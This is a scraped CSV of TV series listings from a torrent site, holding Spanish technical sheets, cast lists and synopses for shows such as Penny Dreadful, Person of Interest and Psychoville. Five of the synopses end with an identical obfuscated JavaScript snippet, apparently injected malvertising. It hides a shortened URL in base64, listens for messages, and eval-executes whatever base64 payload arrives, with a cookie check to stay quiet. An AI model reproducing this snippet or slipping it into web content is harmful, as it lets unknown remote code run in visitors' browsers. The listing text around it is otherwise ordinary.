Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/public-morals/,Public Morals,"
                       Título original: Public Morals
Año: 2015
Duración: 60 min.
País: Estados Unidos
Director: Edward Burns
Guión: Edward Burns
Fotografía: William Rexer
Productora: TNT DRAMA
Género: Drama, Crimen

Capítulos: 10


Reparto:

Austin Stowell ... Sean O'Bannon
Brian Wiles ... Jimmy Shea
Elizabeth Masucci ... Christine
Katrina Bowden ... Fortune
Keith Nobbs ... Pat Duffy
Lili Mirojnick ... Bernadette Tedesco
Lyndon Smith (2) ... Deirdre
Megan Guinan ... Clare
Michael Rapaport ... Charlie Bullman
Patrick Murney ... Petey 'Mac' Mackenna						","
Descripcion
'Public Moral' se traslada hasta 1967 donde los policías de una conocida División de la ciudad de Nueva York se encuentran constantemente en una lucha entre la moralidad y el lado más oscuro de las tentaciones que derivan de todo tipo de vicios. La serie sigue a Terry Muldoon (Ed Burns), un policía consciente de la delgada línea que separa el decoro y la honestidad de la corrupción. Así, su objetivo será guiar a sus subordinados hacía el bien y combatir el oscuro mundo de la delincuencia y el vicio.
"
https://www.subtorrents1.com/series/penny-dreadful/,Penny Dreadful,"
                       Título Original: Penny Dreadful
Creador: John Logan
Producción Ejecutiva: John Logan, Sam Mendes y Pippa Harris
Estudio: Neal Street Productions
Género: Drama
Temporada: 1ª
Episodios: 8
Fecha de estreno: 11 de mayo de 2014
Lugar de rodaje: Dublín (Irlanda)
Horario de emisión: Domingos 10.00 p.m.

Reparto:
Josh Hartnett ... Ethan Chandler
Eva Green ... Vanessa Ives
Billie Piper ... Brona Croft
Rory Kinnear ... La Criatura
Timothy Dalton ... Sir Malcolm
Reeve Carney ... Dorian Gray
Harry Treadaway ... Victor Frankenstein
Helen McCrory ... Madame Kali
Simon Russell Beale ... Ferdinand Lyle
Danny Sapani ... Sembene						","
Descripcion
Penny Dreadful es un espeluznante thriller psicológico creado, escrito y producido por el tres veces nominado al Oscar John Logan (Hugo, El aviador, Gladiator) y Sam Mendes, ganador del prestigioso galardón por la película American Beauty. En ella, algunos de los personajes más aterradores personajes de la literatura universal, entre ellos el doctor Frankenstein, Dorian Gray y figuras icónicas de la novela Drácula, rondarán por las oscuras esquinas del Londres victoriano. Todos ellos son brillantemente reinterpretados con un enfoque completamente diferente al que estamos acostumbrados.
En el centro de la historia está Sir Malcolm (Timothy Dalton, Licencia para matar), un curtido explorador experto en la cultura africana y que se ha embarcado en una importante misión personal. Por culpa de su emocionante carrera ha pagado un precio muy alto. Aunque su casa está llena de maravillosos recuerdos y suvenires de sus viajes, pero se ha alejado de su familia y de sus amigos. Especialmente dolorosa es la separación con su hija, que ha desaparecido misteriosamente. Por eso está decidido a utilizar su inmensa fortuna para conseguir encontrarla. Quiere enmendar los errores de su pasado, sin darse cuenta de que su aventura más difícil tan solo acaba de comenzar.
"
https://www.subtorrents1.com/series/person-of-interest/,Person of Interest,"
                       Título Original: Person of Interest
Creador: Jonathan Nolan
Producción Ejecutiva: J. J. Abrams, Bryan Burk, Jonathan Nolan, Greg Plageman y David Semel
Estudio: Warner Bros. Television
Género: Drama
Temporada: 3ª
Episodios: 22
Fecha de estreno: 23 de septiembre de 2011
Lugar de rodaje: Nueva York
Distribución: Warner
Horario de emisión: Jueves 9.00 p.m.

Reparto:
Michael Emerson ... Finch
Jim Caviezel ... Reese
Taraji P. Henson ... Carter
Kevin Chapman ... Fusco						","
Descripcion
Creada por el aclamado cineasta Jonathan Nolan (El caballero oscuro), Person of Interest es una trepidante serie de acción protagonizada por un ex-agente de la CIA, dado por muerto, que recibe una nueva oportunidad de vivir su antigua vida e impartir justicia. Aprovechando su adiestramiento especial en operaciones encubiertas, formará equipo con un millionario genio de la informática que ha inventado un programa que usa patrones de reconocimiento para identificar a personas que están a punto de cometer algún crimen violento. Juntos lucharán contra los más peligrosos criminales, encarnando una nueva versión del clásico vigilante de la justicia.
"
https://www.subtorrents1.com/series/political-animals-miniserie/,Political Animals (Miniserie),"
                       TÍTULO ORIGINAL: Political Animals
AÑO: 2012
DURACIÓN: 360 min.
PAÍS: Estados Unidos
DIRECTOR: Greg Berlanti
GUIÓN: Greg Berlanti, Laurence Mark
PRODUCTORA: Emitida por la cadena USA Network; Berlanti Productions / Berlanti Television / Laurence Mark Productions / Warner Horizon Television
GÉNERO: Drama | Política. Miniserie de TV

REPARTO: 
Sigourney Weaver, Carla Gugino, Ciarán Hinds, James Wolk, Sebastian Stan, Ellen Burstyn, Brittany Ishibashi

","
Descripcion
Elaine Barrish, ex Primera Dama y actual Secretaria de Estado, se ve recién divorciada, y tiene que lidiar con los problemas del Departamento de Estado a la vez que trata de mantener unida a su familia.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/public-enemies-miniserie/,Public Enemies (Miniserie),"
                       Director: Dearbhla Walsh
Writer: Tony Marchant
Producer: Julia Stannard
Género: Drama
Capítulos: 3 

Paula Radnor ... Anna Friel
Eddie Mottram ... Daniel Mays
Ken Whiteley ... Peter Wight
Kathy Whiteley ... Barbara Marten
Kelly ... Georgina Rich
Colin Bolt ... Terence Maynard
Darren Nunn ... Joel Fry
Ben Somers ... Joe Armstrong
Trevor Brotherton ... Nicholas Gleaves
Marion Sharmer ... Lorraine Ashbourne 						","
Descripcion
Public Enemies es una serie dramática transmitida por la BBC y creada por Tony Marchant. La serie sigue la relación entre Eddie, de 28 años de edad, que ha sido puesto en libertad de la vida de la cárcel y su oficial de libertad condicional, Paula, que acaba de regresar a trabajar después de una suspensión por un crimen cometido por un delincuente bajo su supervisión .(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/private-practice/,Private Practice,"
                       Título Original: Private Practice
Creador: Shonda Rhimes
Producción Ejecutiva: Betsy Beers, Mark Gordon, Mark Tinker, Marti Noxon y Shonda Rhimes
Estudio: ABC Television Studio
Género: Drama
Temporada: 5ª
Episodios: 23
Lugar de rodaje: Los Angeles
Distribución: Buenavista
Audiencia temp. pasada: 7,60 millones de espectadores
Horario de emisión Jueves: 10.00 p.m.

Reparto:
Kate Walsh ... Addison Forbes Montgomery
Tim Daly ... Pete Finch
Taye Diggs ... Sam Bennett
Amy Brenneman ... Violet Turner
Paul Adelstein ... Cooper Freedman
Shavon Kirksey ... Maya Bennett
KaDee Strickland ... Charlotte King
","
Descripcion
De la mano de Shonda Rhimes, la creadora de la aclamada Anatomía de Grey, llega una historia sobre encontrar el camino para comenzar el resto de tu vida. La doctora Addison Forbes Montgomery (Kate Walsh, Anatomía de Grey) es una renombrada cirujana, que tras dejar atrás el Hospital Seattle Grace Hospital, un fracasado matrimonio con Derek ""Doctor Macizo"" Shepherd, y una complicada relación con Mark ""Doctor Caliente"" Sloan, se traslada a Los Angeles en busca de un clima más cálido y de nuevas oportunidades en la vida.
Addison se reune en Los Angeles con sus amigos de la Escuela de Medicina, Naomi (Audra McDonald, The Bedford Diaries) y Sam Bennett (Taye Diggs, Kevin Hill), uniéndose a su clínica Oceanside Wellness en Santa Monica. Naomi, especialista en fertilidad y hormonas y propietaria mayoritaria de la clínica, y Sam, un internista cuyos libros de autoayuda le han convertido en el gurú médico del común de los hombres, están recientemente divorciados. Ambos conviven de forma pacífica debido a su hija adolescente, Maya (Shavon Kirksey), y a su ejercicio profesional, pero la relación entre ambos difícilmente puede calificarse de amigable.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/pitch/,Pitch,"
                       Título original: Pitch
Año: 2016
País: Estados Unidos
Director: Paris Barclay
Guión: Dan Fogelman, Rick Singer
Fotografía: Yasu Tanida
Productora: Rhode Island Ave. Productions / 20th Century Fox Television
Género: Drama | Béisbol

Capítulos: 13


Reparto:

Kylie Bunbury ... Ginny Baker
Mark-Paul Gosselaar ... Mike Lawson
Mark Consuelos ... Oscar Arguella
Mo McRae ... Blip Sanders
Meagan Holder ... Evelyn Sanders
Tim Jo ... Eliot
Dan Lauria ... Al Luongo
Ali Larter ... Amelia Slater						","
Descripcion
Centrada en una joven estrella del béisbol, esta serie cuenta la historia de la primera mujer que desafiando todos los obstáculos y en contra a todas las probabilidades, logró jugar en las Grandes Ligas de Béisbol (MLB, por sus siglas en inglés).
Pitch es una serie de televisión de género dramático creada por Dan Fogelman y Rick Singer, y desarrollada para Fox, bajo producción de la compañía 20th Century Fox Television de la mano de Rhode Island Ave. Productions y Left Coast Productions.
"
https://www.subtorrents1.com/series/private-eyes/,Private Eyes,"
                       Título original
    Private Eyes (TV Series) 
Año
    2016
Duración
    43 min.
País
    Canadá Canadá
Director
    Kelly Makin, Robert Lieberman, Jerry Ciccoritti, James Genn, Charles Officer, Shawn Piller, Anne Wheeler 
Guion
    Shelley Eriksen, Tim Kilby, Anne Wheeler
Música
    Shawn Pierce
Fotografía
    Pierre Jodoin, Eric Cayla
Reparto
    Jason Priestley, Cindy Sampson, Ashley Bryant, Barry Flatman, Jordyn Negri, Ennis Esmer, Clé Bennett 
Productora
    Entertainment One
Género
    Serie de TV. Drama. Comedia | Crimen 						","
Descripcion
En este drama, cuya primera temporada rodada en Toronto consta de 10 episodios, seguimos la vida de un ex profesional del hockey llamado Matt Shade (Priestley) que cambia su vida irrevocablemente cuando decide formar equipo con Angie Everett (Sampson) para formar una agencia de detectives.
"
https://www.subtorrents1.com/series/primeval-new-world/,Primeval: New World,"
                       Temporada 1
01 - El nuevo mundo - Director: Martin Wood, Writer (s): Judith y Garfield Reeves-Stevens.
Cuando las criaturas prehistóricas comienzan a aparecer en Vancouver, corresponde a un pequeño grupo de civiles para manejar los depredadores mortales, y para investigar las anomalías en el tiempo que están llegando.

02 - Sisiutl - Director: Andy Mikita, Writer (s): Judith y Garfield Reeves-Stevens.
Evan y Mac investigar una serpiente de mar prehistórico aterrorizar a las aguas cercanas a las Naciones disputada Primeros territorio. Dylan se enfrenta a una encrucijada cuando Evan recluta a unirse a su equipo.

03 - Fear of Flying - Director: Mike Rohl, Guión: Jon Cooksey.

04 - Angry Birds - Director: Andy Mikita, Guionista: Gillian Horvath

05 - Director: Mike Rohl, Guión: Sarah Dodd

06 - Director: Amanda Tapping, Writer: 

07 - Babes in the Woods - Director: Andy Mikita, escritor: Katherine Collins

08 - Verdad - Director: Amanda Tapping, Writer: Gillian Horvath

09 - Breakthrough - Director: Andy Mikita, Writer (s): Dennis Heaton con Judy y Gar Reeves-Stevens

10 - The Great Escape - Director: Amanda Tapping, 

11 - La Inquisición - Director: Escrito por Martin Wood, Jon Cooksey

12 - El sonido del trueno, Parte 1  Writer (s): Horvath, Katherine Collins, Peter Hume

13 - El sonido del trueno, parte 2  Writer (s): Gillian Horvath, Katherine Collins 

Reparto principal:
Niall Matter ... Evan Cruz
Sara Canning ... Dylan Weir
Danny Rahim ... Mac Rendell
Crystal Lowe ... Toby Nance
Geoff Gustafson ... Ken Leeds
Miranda Frigon ... Ange Finch

Actores Invitados:
Lani Gelera ... Jill
Clint Carleton ... Jack
Tom Butler ... Tony Drake
Michael Strusievici ... Trevor
Andrew-Lee Potts ... Connor Temple
Kimberly Sustad ... Brooke Cruz
Adrian Holmes ... detective Harlow
Sandy Sidhu ... Pallavi Grewal
Patrick Gilmore ... Blake
Kett Turton ... Skeezer
Colin Ferguson ... Howard Kanan
Lexa Doig ... Doctor Mara Fridkin
Eric Breker ... Macready
Dan Payne ... Douglas
Robert Lawrenson ... TBA
Rukiya Bernard ... TBA
Louis Ferriera ... Henderson Hall 						","
Descripcion
""Primeval: New World"" es un spin-off de la original Primeval serie, ubicado en Vancouver, Canadá Primeval:. Nuevo Mundo sigue a un equipo de expertos y los científicos que investiga la aparición de anomalías temporales y batallas ambas criaturas prehistóricas y futurista.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/pennyworth/,Pennyworth,"
                       Título original
Pennyworth (TV Series)
Año
2019
Duración
60 min.
País
Estados Unidos Estados Unidos
Dirección
Jon East,  China Moo-Young
Guion
Danny Cannon, Bruno Heller
Música
David E. Russo
Fotografía
Mark Patten, Jake Polonsky
Reparto
Jack Bannon,  Hainsley Lloyd Bennett,  Ben Aldridge,  Dorothy Atkinson, Paloma Faith,  Jason Flemyng,  Ryan Fletcher,  Ian Puleston-Davies,  Nicki Vickery, Polly Walker,  Jessica Ellerby,  Dywayne Thomas,  Ben Wiggins,  Charlie Woodward, Dave Simon,  Freddy Carter,  Wong Charlie,  Jasper Jacob,  Bruce Johnson,  Alex Mills, Luigi Boccanfuso,  Paul Brennen,  Jarren Dalmeda,  Lukas DiSparrow, Stephan Genovese,  Darcy Grey,  Madalina Bellariu Ion,  Melissa Knatchbull, Mishael Lazarus,  Tiago Martins,  Henry Miller,  Demi Rickard,  Israel Ruiz, Ben Sardeson,  Joakim Skarli,  Marcus Smith
Productora
Warner Horizon Television. Distribuida por Epix
Género
Serie de TV. Acción. Drama | Crimen. Cómic. DC Comics						","
Descripcion
Sinopsis
10 episodios. La historia de Alfred Pennyworth, un antiguo miembro de las fuerzas especiales londinenses que se encarga de trabajar para el padre de Bruce Wayne. 
"
https://www.subtorrents1.com/series/please-like-me/,Please Like Me,"
                       Título: Please Like Me
Género: Comedia - Drama  
Creador: Josh Thomas  
Guionista: Josh Thomas  
Director: Mateo Saville 
País: Australia  
Idioma original: Inglés

Temporadas: 1  
Episodios: 6 

Reparto:

Josh Thomas ... Josh 
Thomas Ward ... Tom 
Caitlin Stasey ... Claire 
Debra Lawrance ... mamá 
David Roberts ... papá 
Judi Farr ... tía Peg 
Andrew S. Gilbert ... Rod 
Nikita Leigh-Pritchard ... Niamh 
Renee Lim ... Mae						","
Descripcion
Please Like Me es una serie de comedia de la televisión australiana protagonizada por Josh Thomas .  La serie gira en torno a Josh, que está creciendo rápidamente y se da cuenta de que sus padres no son héroes, sino tontos que no tienen idea de lo que está pasando, igual que él. [1] La serie se estrenó el 28 de febrero de 2013 en ABC2.
"
https://www.subtorrents1.com/series/psychoville/,Psychoville,"
                       TÍTULO ORIGINAL: Psychoville (TV Series)
AÑO: 2009 	
PAÍS: Reino Unido
DIRECTOR: Steve Pemberton (Creator), Reece Shearsmith (Creator), Matt Lipsey
GUIÓN: Steve Pemberton, Reece Shearsmith
MÚSICA: Joby Talbot
FOTOGRAFÍA: Francis De Groote

REPARTO:
Reece Shearsmith, Steve Pemberton, David Bamber, Dawn French, Eileen Atkins, Janet McTeer, Daniel Kaluuya

PRODUCTORA: Emitida por la cadena BBC
GÉNERO 	Serie de TV. Comedia | Comedia negra
","
Descripcion
SINOPSIS:
Comedia inglesa de humor negro creada por Steve Pemberton y Reece Shearsmith (The League of Gentlemen's), que pone el foco sobre un elenco de personajes muy extraños. Mr. Jelly es un payaso que no soporta el éxito de Mr. Jolly, otro payaso como él. Joy es una partera convencida de que su bebé, un muñeco que utiliza para las prácticas con futuros padres, pronto tendrá vida real. Robert es un enano enamorado de la protagonista de la obra en la que actúa: Blanca Nieves. David Sowerbutts es un niño que vive encerrado en el cuerpo de un adulto, pero que en realidad es un asesino serial. Y Mr. Lomax es un coleccionista de peluches, ciego y avaricioso. Todos ellos guardan un oscuro secreto. Y recibirán una carta anónima que asegura concocer lo que ocultan. Detrás de esa carta se esonde un misterioso sujeto enmascarado.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
